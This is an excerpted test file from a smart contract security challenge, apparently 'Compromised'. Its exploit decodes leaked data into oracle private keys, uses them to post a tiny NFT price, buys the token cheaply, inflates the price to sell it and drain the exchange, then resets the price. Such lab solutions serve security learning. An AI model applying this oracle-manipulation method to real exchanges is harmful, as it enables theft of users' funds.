...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    // Extract private keys from data
    sensitiveData.forEach((data) => {
      data = ethers.utils.toUtf8String("0x".concat(data.replace(/\s/g, "")));

      bytesKey = ethers.utils.base64.decode(data);
      key = ethers.utils.toUtf8String(bytesKey);
    ...
    for (let signer of signers) {
      await this.oracle.connect(signer).postPrice("DVNFT", MIN_PRICE);
    }
    ...
    const tx = await this.exchange
      .connect(attacker)
      .buyOne({ value: medianPrice });

    const receipt = await tx.wait();
    const event = receipt.events.filter(
      (event) => event.eventSignature === "TokenBought(address,uint256,uint256)"
    );
    ...
    for (let signer of signers) {
      await this.oracle
        .connect(signer)
        .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(MIN_PRICE));
    }

    // Sell the overpriced token
    await this.nftToken
      .connect(attacker)
    ...
    // Return the price to the original price
    for (let signer of signers) {
